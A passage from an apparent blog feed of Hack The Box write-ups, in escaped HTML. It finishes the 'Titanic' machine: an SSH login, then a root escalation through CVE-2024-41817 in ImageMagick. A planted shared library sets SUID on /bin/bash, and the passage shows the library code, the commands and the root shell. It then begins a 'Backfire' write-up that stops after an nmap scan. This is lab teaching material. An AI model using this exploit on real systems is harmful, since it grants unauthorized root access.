We use this password to SSH into the machine and retrieve the flag.&lt;br>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="hl">&lt;span class="lnt">3
&lt;/span>&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="hl">&lt;span class="lnt">5
&lt;/span>&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">ssh&lt;/span> &lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">htb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">gitea&lt;/span> &lt;span class="nx">mysql&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">user&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">e85d89a008cff72094f40882eb2f7d9b&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="root">Root
&lt;/h2>&lt;h3 id="cve-2024-41817imagemagick">CVE-2024-41817(ImageMagick)
&lt;/h3>&lt;p>Once on the machine, we notice the script &lt;code>identify_images.sh&lt;/code> in &lt;code>/opt/scripts/&lt;/code>.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="lnt">11
&lt;/span>&lt;span class="lnt">12
&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="lnt">14
&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="lnt">16
&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;span class="lnt">21
&lt;/span>&lt;span class="lnt">22
&lt;/span>&lt;span class="lnt">23
&lt;/span>&lt;span class="hl">&lt;span class="lnt">24
&lt;/span>&lt;/span>&lt;span class="lnt">25
&lt;/span>&lt;span class="lnt">26
&lt;/span>&lt;span class="lnt">27
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">tree&lt;/span> &lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">.&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="nx">app&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">app&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">py&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">static&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">assets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">images&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">entertainment&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">exquisite&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">dining&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">favicon&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ico&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">home&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">luxury&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">cabins&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">jpg&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">styles&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">css&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">templates&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">index&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">html&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="err">&lt;/span> &lt;span class="nx">tickets&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="nx">containerd&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="kt">error&lt;/span> &lt;span class="nx">opening&lt;/span> &lt;span class="nx">dir&lt;/span>&lt;span class="p">]&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">&lt;/span> &lt;span class="nx">scripts&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="err">&lt;/span> &lt;span class="nx">identify_images&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">8&lt;/span> &lt;span class="nx">directories&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">10&lt;/span> &lt;span class="nx">files&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">scripts&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">identify_images&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cd&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">truncate&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">s&lt;/span> &lt;span class="mi">0&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">find&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>&lt;span class="o">/&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="kd">type&lt;/span> &lt;span class="nx">f&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">name&lt;/span> &lt;span class="s">&amp;#34;*.jpg&amp;#34;&lt;/span> &lt;span class="p">|&lt;/span> &lt;span class="nx">xargs&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">usr&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">magick&lt;/span> &lt;span class="nx">identify&lt;/span> &lt;span class="o">&amp;gt;&amp;gt;&lt;/span> &lt;span class="nx">metadata&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">log&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
This command identifies the format and characteristics of files ending with .jpg in &lt;code>/opt/app/static/assets/images/&lt;/code> and stores them in &lt;code>/opt/app/static/assets/metadata.log&lt;/code>.&lt;br>
We notice the timestamp of metadata.log is updated every minute, the script is owned by root so it could be in a cron job.&lt;br>
The commands &lt;code>truncate&lt;/code>, &lt;code>find&lt;/code>, &lt;code>xargs&lt;/code> are not exploitable here. &lt;code>Imagemagick&lt;/code> being a tool used in CTFs in vulnerable versions, we look for CVEs associated with its version &lt;code>7.1.1-35&lt;/code>.&lt;br>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:~&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">magick&lt;/span> &lt;span class="o">--&lt;/span>&lt;span class="nx">version&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">Version&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">ImageMagick&lt;/span> &lt;span class="mf">7.1.1&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mi">35&lt;/span> &lt;span class="nx">Q16&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">HDRI&lt;/span> &lt;span class="nx">x86_64&lt;/span> &lt;span class="mi">1&lt;/span>&lt;span class="nx">bfce2a62&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="mi">20240713&lt;/span> &lt;span class="nx">https&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="c1">//imagemagick.org&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">...&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;p>We find &lt;a class="link" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" target="_blank" rel="noopener"
>this advisory on Github&lt;/a> regarding &lt;code>CVE-2024-41817&lt;/code> allowing arbitrary code execution on versions &amp;lt;= 7.1.1-35.&lt;br>
To obtain code execution as root, we will adapt the POC mentioned by replacing id to set the SUID on /bin/bash.
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt"> 1
&lt;/span>&lt;/span>&lt;span class="lnt"> 2
&lt;/span>&lt;span class="lnt"> 3
&lt;/span>&lt;span class="lnt"> 4
&lt;/span>&lt;span class="lnt"> 5
&lt;/span>&lt;span class="lnt"> 6
&lt;/span>&lt;span class="lnt"> 7
&lt;/span>&lt;span class="lnt"> 8
&lt;/span>&lt;span class="lnt"> 9
&lt;/span>&lt;span class="lnt">10
&lt;/span>&lt;span class="hl">&lt;span class="lnt">11
&lt;/span>&lt;/span>&lt;span class="hl">&lt;span class="lnt">12
&lt;/span>&lt;/span>&lt;span class="lnt">13
&lt;/span>&lt;span class="hl">&lt;span class="lnt">14
&lt;/span>&lt;/span>&lt;span class="lnt">15
&lt;/span>&lt;span class="hl">&lt;span class="lnt">16
&lt;/span>&lt;/span>&lt;span class="lnt">17
&lt;/span>&lt;span class="lnt">18
&lt;/span>&lt;span class="lnt">19
&lt;/span>&lt;span class="lnt">20
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">cat&lt;/span> &lt;span class="nx">libxcb&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">stdio&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">stdlib&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="err">#&lt;/span>&lt;span class="nx">include&lt;/span> &lt;span class="p">&amp;lt;&lt;/span>&lt;span class="nx">unistd&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">h&lt;/span>&lt;span class="p">&amp;gt;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nf">__attribute__&lt;/span>&lt;span class="p">((&lt;/span>&lt;span class="nx">constructor&lt;/span>&lt;span class="p">))&lt;/span> &lt;span class="nx">void&lt;/span> &lt;span class="nf">init&lt;/span>&lt;span class="p">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">system&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;chmod +s /bin/bash&amp;#34;&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl"> &lt;span class="nf">exit&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">);&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="p">}&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">gcc&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="nx">c&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">shared&lt;/span> &lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">fPIC&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">o&lt;/span> &lt;span class="p">.&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">so&lt;/span>&lt;span class="mf">.1&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">mv&lt;/span> &lt;span class="nx">libxcb&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">so&lt;/span>&lt;span class="mf">.1&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">opt&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">app&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">static&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">assets&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">images&lt;/span>&lt;span class="o">/&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">ld&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="o">-&lt;/span>&lt;span class="nx">rwsr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">sr&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">x&lt;/span> &lt;span class="mi">1&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="nx">root&lt;/span> &lt;span class="mi">1396520&lt;/span> &lt;span class="nx">Mar&lt;/span> &lt;span class="mi">14&lt;/span> &lt;span class="mi">2024&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">bin&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">bash&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line hl">&lt;span class="cl">&lt;span class="nx">developer&lt;/span>&lt;span class="err">@&lt;/span>&lt;span class="nx">titanic&lt;/span>&lt;span class="p">:&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tmp&lt;/span>&lt;span class="err">$&lt;/span> &lt;span class="nx">bash&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">p&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.1&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">id&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">uid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">gid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">euid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">egid&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nx">groups&lt;/span>&lt;span class="p">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">root&lt;/span>&lt;span class="p">),&lt;/span>&lt;span class="mi">1000&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">developer&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">bash&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="mf">5.1&lt;/span>&lt;span class="err">#&lt;/span> &lt;span class="nx">ls&lt;/span> &lt;span class="o">/&lt;/span>&lt;span class="nx">root&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">cleanup&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">images&lt;/span> &lt;span class="nx">revert&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">sh&lt;/span> &lt;span class="nx">root&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">txt&lt;/span> &lt;span class="nx">snap&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>&lt;/p>
&lt;h2 id="resources">Resources
&lt;/h2>&lt;blockquote>
&lt;p>&lt;a class="link" href="https://github.com/hashcat/hashcat/pull/4154/files#diff-ccd519555457fa8e0c74b0dc7bd66727216dd446c7bcff8cd5196fe919e2b000" target="_blank" rel="noopener"
>gitea2hashcat.py&lt;/a>&lt;br>
&lt;a class="link" href="https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8" target="_blank" rel="noopener"
>Advisory Github for CVE-2024-41817&lt;/a>&lt;/p>&lt;/blockquote></description></item><item><title>Backfire - Linux Medium - HTB Writeup</title><link>https://01MI.github.io/p/backfire-htb-writeup-linux-medium/</link><pubDate>Sat, 07 Jun 2025 00:00:00 +0000</pubDate><guid>https://01MI.github.io/p/backfire-htb-writeup-linux-medium/</guid><description>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/Backfire.PNG" alt="Featured image of post Backfire - Linux Medium - HTB Writeup" />&lt;h2 id="summary">Summary
&lt;/h2>&lt;p>User Ilya: Havoc C2 Exploit: SSRF + RCE&lt;br>
Lateral mouvement to Sergej: HardHat C2 Exploit: Authentification bypass + RCE&lt;br>
Root: Sudo misconfiguration&lt;/p>
&lt;h2 id="enumeration">Enumeration
&lt;/h2>&lt;p>Starting with an nmap scan, we can identify two web services, the one accessible on port 8000 catch our attention here.&lt;/p>
&lt;div class="highlight">&lt;div class="chroma">
&lt;table class="lntable">&lt;tr>&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code>&lt;span class="hl">&lt;span class="lnt">1
&lt;/span>&lt;/span>&lt;span class="lnt">2
&lt;/span>&lt;span class="lnt">3
&lt;/span>&lt;span class="lnt">4
&lt;/span>&lt;span class="lnt">5
&lt;/span>&lt;span class="lnt">6
&lt;/span>&lt;span class="lnt">7
&lt;/span>&lt;span class="lnt">8
&lt;/span>&lt;/code>&lt;/pre>&lt;/td>
&lt;td class="lntd">
&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="line hl">&lt;span class="cl">&lt;span class="err">$&lt;/span> &lt;span class="nx">nmap&lt;/span> &lt;span class="mf">10.10.11.49&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">Pn&lt;/span> &lt;span class="o">-&lt;/span>&lt;span class="nx">v&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="nx">PORT&lt;/span> &lt;span class="nx">STATE&lt;/span> &lt;span class="nx">SERVICE&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">22&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">ssh&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">443&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">https&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">5000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">upnp&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">7096&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">filtered&lt;/span> &lt;span class="nx">unknown&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="mi">8000&lt;/span>&lt;span class="o">/&lt;/span>&lt;span class="nx">tcp&lt;/span> &lt;span class="nx">open&lt;/span> &lt;span class="nx">http&lt;/span>&lt;span class="o">-&lt;/span>&lt;span class="nx">alt&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/td>&lt;/tr>&lt;/table>
&lt;/div>
&lt;/div>
&lt;h2 id="user-ilya">User Ilya
&lt;/h2>&lt;h3 id="exploit-havoc-c2-srf--rce">Exploit Havoc C2: SRF + RCE
&lt;/h3>&lt;p>The directory listing exposed on the port 8000 allows us to retrieve two files:&lt;/p>
&lt;ul>
&lt;li>&lt;code>disable.tls.patch&lt;/code>: This file indicates that TLS is disabled for WebSocket management on port 40056, allowing an unsecure connection.&lt;/li>
&lt;li>&lt;code>havoc.yaotl&lt;/code>: A configuration file for the &lt;a class="link" href="https://github.com/HavocFramework/Havoc" target="_blank" rel="noopener"
>Havoc&lt;/a> C2 framework.&lt;/li>
&lt;/ul>
&lt;p>&lt;img src="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire.PNG"
width="500"
height="153"
srcset="https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_eb374eaa37102dc2.PNG 480w, https://01MI.github.io/p/backfire-htb-writeup-linux-medium/DL-Backfire_hu_5ec44830e48e9964.PNG 1024w"
loading="lazy"
class="gallery-image"
data-flex-grow="326"
data-flex-basis="784px"
>&lt;/p>
